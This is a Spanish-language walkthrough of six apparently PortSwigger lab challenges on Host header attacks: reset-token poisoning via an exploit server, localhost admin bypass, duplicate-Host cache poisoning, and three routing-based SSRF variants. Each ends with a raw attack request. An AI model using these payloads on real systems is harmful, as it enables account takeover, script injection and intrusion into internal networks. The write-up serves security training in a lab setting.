## Reto 1: Envenenamiento básico de restablecimiento de contraseña


Este laboratorio es vulnerable al envenenamiento por restablecimiento de contraseña. El usuario carlos Hará clic sin cuidado en cualquier enlace de los correos electrónicos que reciba. Para resolver el laboratorio, inicia sesión en la cuenta de Carlos.

Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales: wiener:peterCualquier correo electrónico enviado a esta cuenta puede ser leído a través del cliente de correo electrónico en el servidor explotado. 

La vulnerabilidad de tipo password reset poisoning, aprovechando una falta de validación en la cabecera Host del servidor. Al iniciar el proceso de recuperación de contraseña, se genera un enlace con un token temporal que es enviado por correo. Sin embargo, si manipulamos la cabecera Host en la petición de reseteo, el servidor incluirá esa cabecera manipulada en el enlace enviado al usuario.

Carlos, un usuario descuidado, accederá al enlace con ese dominio malicioso, haciendo que su navegador nos envíe la solicitud con el token de reseteo a nuestro servidor. Desde los registros de acceso, capturamos el token, lo utilizamos para modificar su contraseña y accedemos a su cuenta. Se explica paso a paso cómo identificar esta lógica vulnerable, manipular el Host, interceptar el token y completar el acceso no autorizado.

```
POST /forgot-password HTTP/2
Host: exploit-0aca00f203a8a118800ce3d8018d005d.exploit-server.net
csrf=zc9GlD3cFOLbq2POQ0v75R2aQ4xncaFq&username=carlos
```

## Reto 2: Omisión de autenticación de encabezado de host

Este laboratorio parte de una suposición sobre el nivel de privilegios del usuario basándose en la cabecera HTTP Host.

Para resolver el laboratorio, acceda al panel de administración y elimine el usuario. carlos. 

vulnerabilidad lógica donde el servidor confía ciegamente en el valor de la cabecera Host para determinar si una petición proviene de un usuario con privilegios locales. Esta suposición es peligrosa, ya que el cliente puede modificar libremente esta cabecera.

Durante el laboratorio, al intentar acceder al panel /admin, se recibe un mensaje indicando que solo es accesible desde localhost. Modificando la cabecera Host a localhost usando Burp Repeater, el servidor acepta la petición como si viniera de un entorno de confianza, permitiéndonos acceder al panel de administración sin necesidad de autenticación real.

Desde ahí, se puede ejecutar la acción de eliminar al usuario carlos, demostrando cómo una validación deficiente del Host puede derivar en una escalada de privilegios y control completo sobre funcionalidades críticas.


```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
```
## Reto 3: Envenenamiento de la caché web mediante solicitudes ambiguas


Este laboratorio es vulnerable al envenenamiento de caché web debido a discrepancias en la forma en que la caché y la aplicación de servidor gestionan las solicitudes ambiguas. Un usuario desprevenido visita regularmente la página de inicio del sitio.

Para resolver el experimento, envenena la caché para que se ejecute la página de inicio. alert(document.cookie)en el navegador de la víctima. 

realizar un ataque de Web Cache Poisoning al manipular el comportamiento del servidor frente a peticiones ambiguas, concretamente aquellas con múltiples cabeceras Host.

El laboratorio demuestra que el servidor ignora la segunda cabecera Host a la hora de validar la petición, pero aún así refleja su valor en la respuesta dentro de una URL absoluta para cargar un script (/resources/js/tracking.js). Esta diferencia de interpretación entre el sistema de caché y el back-end permite que un atacante almacene en caché una versión maliciosa de la página, que luego será servida a otros usuarios.

El atacante almacena en su servidor una versión maliciosa de ‘tracking.js‘ que ejecuta ‘alert(document.cookie)‘. Luego, mediante Burp Repeater, envía una petición con dos cabeceras Host: una válida para que la caché acepte la respuesta y otra apuntando a su servidor. Al forzar múltiples peticiones con distintos parámetros (?cb=123, etc.), consigue que el contenido envenenado se almacene en la caché.

Cuando el usuario víctima accede a la home, el navegador carga el script desde el servidor del atacante, ejecutando el payload JavaScript. La clase enseña cómo aprovechar una discrepancia sutil entre la caché y el servidor para inyectar contenido malicioso, algo especialmente peligroso en sitios de alto tráfico.

```
GET / HTTP/1.1
Host: 0a9a004a0479740b8008cb40000e00dc.h1-web-security-academy.net
Host: exploit-0ab400ee0408740380cecadd01dc0001.exploit-server.net
```

## Reto 4: SSRF basado en enrutamiento

Este laboratorio es vulnerable a ataques SSRF basados ​​en enrutamiento a través de la cabecera Host. Esta vulnerabilidad permite acceder a un panel de administración de intranet inseguro ubicado en una dirección IP interna.

Para resolver el laboratorio, acceda al panel de administración interno ubicado en el 192.168.0.0/24 , luego elimine el usuario carlos. 

El laboratorio presenta una aplicación que redirige el tráfico en función del valor de la cabecera Host. Mediante Burp Collaborator, comprobamos que la aplicación es capaz de emitir peticiones externas basadas en el valor de Host, lo que demuestra una clara exposición SSRF.

Utilizando Burp Intruder, realizamos un ataque por fuerza bruta sobre la cabecera Host, explorando toda la subred 192.168.0.0/24. Uno de los valores devuelve un 302 hacia /admin, indicando que hemos accedido al panel interno. A partir de ahí, inspeccionamos el panel para capturar el token CSRF y la cookie de sesión, y construimos manualmente una petición POST a /admin/delete, incluyendo el token y el nombre de usuario carlos como parámetros.

```
GET /admin/delete?username=carlos&csrf=JDNJbgVsVpKcoi1LnbmcSAhrkOGEbkOp HTTP/2
Host: 192.168.0.94
```
## Reto 5: SSRF mediante análisis de solicitudes defectuoso

Este laboratorio es vulnerable a ataques SSRF basados ​​en enrutamiento debido a un error en el análisis del host de destino de la solicitud. Esto permite acceder a un panel de administración de intranet inseguro ubicado en una dirección IP interna.

Para resolver el laboratorio, acceda al panel de administración interno ubicado en el 192.168.0.0/24rango, luego elimine el usuario carlos. 

El Server-Side Request Forgery (SSRF) basado en un fallo de parsing que ocurre cuando la aplicación analiza mal el destino real de la petición al recibir una URL absoluta en lugar de usar solo el valor de la cabecera Host.

El laboratorio permite el acceso al panel interno de administración ubicado en una IP del rango 192.168.0.0/24. Aunque el servidor bloquea los intentos de modificar directamente la cabecera Host, se descubre que al emplear una URL absoluta en la línea de la petición (por ejemplo, GET https://host/), se puede forzar al middleware a redirigir la petición basándose en esa URL, ignorando el valor de la cabecera Host.

Se utiliza Burp Collaborator para verificar que efectivamente el backend realiza peticiones hacia dominios arbitrarios incluidos en esa línea. Luego, mediante Burp Intruder, se fuerza una enumeración de direcciones IP internas hasta encontrar la del panel /admin.

Una vez encontrado, se obtiene el token CSRF y la cookie de sesión del panel, y se construye una petición manual GET apuntando a /admin/delete con los parámetros correctos para eliminar al usuario carlos.


```
GET https://0a6300eb039339be817e4881005d001b.web-security-academy.net/admin/delete?username=carlos&csrf=Xd65sFbfEcEEkaxAwtgh1oM8uJKFaIBt HTTP/2

Host: 192.168.0.125
```

## Reto 6: Omisión de la validación del host mediante un ataque al estado de la conexión

Este laboratorio es vulnerable a ataques SSRF basados ​​en enrutamiento a través de la cabecera Host. Aunque el servidor front-end pueda parecer inicialmente que realiza una validación robusta de la cabecera Host, asume información sobre todas las solicitudes en una conexión basándose en la primera solicitud que recibe.

Para resolver el laboratorio, aproveche este comportamiento para acceder a un panel de administración interno ubicado en 192.168.0.1/admin, luego elimina al usuario carlos

vulnerabilidad de Server-Side Request Forgery (SSRF) avanzada, donde el servidor valida correctamente la cabecera Host en la primera petición, pero omite esa validación en las siguientes peticiones de la misma conexión. Este tipo de fallo se basa en un mal manejo del estado de conexión y está inspirado en ataques reales descubiertos por PortSwigger, como los Browser-Powered Desync Attacks.

El ataque comienza realizando una petición aparentemente legítima con la cabecera Host apuntando al dominio del laboratorio. A continuación, dentro del mismo canal TCP (mediante “Send group in sequence” en Burp Repeater), se encadena una segunda petición apuntando al host interno 192.168.0.1, específicamente al endpoint /admin.

Debido a la conexión persistente y a que el servidor asumió que todas las peticiones de esa conexión eran válidas tras la primera validación, la segunda petición se enruta internamente sin aplicar la misma validación estricta. Esto permite acceder al panel de administración sin autorización.

Una vez dentro del panel, se recuperan los detalles del formulario (token CSRF, nombre del parámetro username y la ruta /admin/delete) y se construye manualmente una petición POST que, al ser enviada en la misma conexión persistente, permite eliminar al usuario carlos.

La primera consulta es:
```
GET / HTTP/1.1
Host: 0acb00d20413d0e4806fd04500720061.h1-web-security-academy.net
```
La segunda que se mandan a la vez agrupada es:

```
GET /admin/delete?username=carlos&csrf=feZOoSk9ujMEIdTa5a3mdlxIQ957LHIz HTTP/1.1
Host: 192.168.0.1
```